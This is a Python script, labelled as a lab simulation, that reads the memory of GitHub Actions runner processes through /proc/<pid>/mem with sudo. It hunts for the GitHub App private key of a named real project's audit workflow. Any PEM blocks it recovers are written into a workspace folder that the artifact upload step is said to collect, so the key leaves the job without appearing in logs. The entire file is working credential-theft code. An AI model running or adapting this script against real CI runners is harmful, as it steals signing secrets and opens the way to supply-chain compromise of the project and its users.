#!/usr/bin/env python3
# SIMULATION / LAB ONLY — repojack 2026-11-20
#
# Tests the draft's untested inference for nervosnetwork/ckb scheduled_audit.yaml:
# a later step in the same job can recover the RELEASE_PLZ_APP_PRIVATE_KEY that
# the earlier actions/create-github-app-token step consumed.
#
# Why this should work on a GitHub-hosted runner:
#   * The runner (Runner.Worker, a .NET process) materializes the job's secret
#     values to hand them to each step (env vars), and registers them for log
#     masking -> the full PEM text sits in its heap for the whole job.
#   * .NET strings are UTF-16LE; we scan both ASCII and UTF-16LE.
#   * ubuntu runners give the job user passwordless sudo -> root can read
#     /proc/<pid>/mem of any process.
#
# Output: candidate PEM blobs + scan.json under ./sim-recovered/ in the
# workspace (picked up by the artifact upload step). Never printed to logs.
import glob
import hashlib
import json
import os
import re

PEM_RE = re.compile(
    rb'-----BEGIN (?:[A-Z0-9 ]{1,40})-----\r?\n(?:[A-Za-z0-9+/=]{1,76}\r?\n){5,}-----END (?:[A-Z0-9 ]{1,40})-----')
BEGIN_ASCII = b'-----BEGIN'
BEGIN_UTF16 = '-----BEGIN'.encode('utf-16-le')

def comm(pid):
    try:
        with open(f"/proc/{pid}/comm") as f:
            return f.read().strip()
    except OSError:
        return "?"

def rw_regions(pid):
    out = []
    try:
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (r)([w-])([p-]) \S+ \S+ \S+\s*(\S*)$', line.strip())
                if not m or m.group(4) != 'w':
                    continue
                path = m.group(6)
                if path.startswith("/") or path.startswith("["):
                    continue  # file-backed/vvar are noise; secrets live in anon heap
                out.append((int(m.group(1), 16), int(m.group(2), 16)))
    except OSError:
        pass
    return out

def read_region(fd, start, end):
    data = b""
    off = start
    while off < end:
        try:
            chunk = os.pread(fd, min(end - off, 8 << 20), off)
        except OSError:
            break
        if not chunk:
            break
        data += chunk
        off += len(chunk)
        if len(data) > 256 << 20:
            break
    return data

def candidates_in(buf):
    """Full-PEM matches first; fall back to marker windows."""
    found = []
    for m in PEM_RE.finditer(buf):
        found.append(m.group(0))
    if not found:
        # marker windows: ASCII + UTF-16LE (both byte alignments)
        marks = [m.start() for m in re.finditer(re.escape(BEGIN_ASCII), buf)]
        text = buf.decode("utf-16-le", "ignore")
        marks += [m.start() * 2 for m in re.finditer(re.escape(BEGIN_ASCII), text.encode("latin1", "ignore"))]
        marks2 = [m.start() * 2 for m in re.finditer(re.escape(BEGIN_UTF16), buf)]
        for pos in marks + marks2:
            win = buf[pos:pos + 8192]
            if b'-----BEGIN' in win or BEGIN_UTF16 in win:
                found.append(win)
    return found

def main():
    print("== SIM: scanning runner processes for the App private key ==")
    pids = sorted(int(os.path.basename(p)) for p in glob.glob("/proc/[0-9]*"))
    runner = [p for p in pids if comm(p).startswith("Runner.")]
    others = [p for p in pids if p not in runner]
    print(f"  runner pids: {runner}; scanning {len(others) + len(runner)} processes total")

    os.makedirs("sim-recovered", exist_ok=True)
    seen, meta, scanned = set(), [], 0
    for pid in runner + others:
        try:
            fd = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
        except OSError:
            continue
        with fd:
            for start, end in rw_regions(pid):
                scanned += 1
                for blob in candidates_in(read_region(fd, start, end)):
                    sha = hashlib.sha256(blob).hexdigest()
                    if sha in seen:
                        continue
                    seen.add(sha)
                    name = f"sim-recovered/cand-{pid}-{sha[:12]}.pem"
                    with open(name, "wb") as f:
                        f.write(blob)
                    os.chmod(name, 0o644)
                    meta.append({
                        "file": name, "pid": pid, "comm": comm(pid),
                        "sha256": sha, "bytes": len(blob),
                        "head": blob[:32].decode("latin1").strip(),
                        "tail": blob[-20:].decode("latin1").strip(),
                    })
                    print(f"  candidate: pid={pid}({comm(pid)}) bytes={len(blob)} sha256={sha[:16]}...")
    with open("sim-recovered/scan.json", "w") as f:
        json.dump({"regions_scanned": scanned, "n_unique": len(meta), "candidates": meta}, f, indent=2)
    os.chmod("sim-recovered/scan.json", 0o644)
    print(f"== SIM: scan done: {scanned} rw regions, {len(meta)} unique candidates in ./sim-recovered ==")

if __name__ == "__main__":
    main()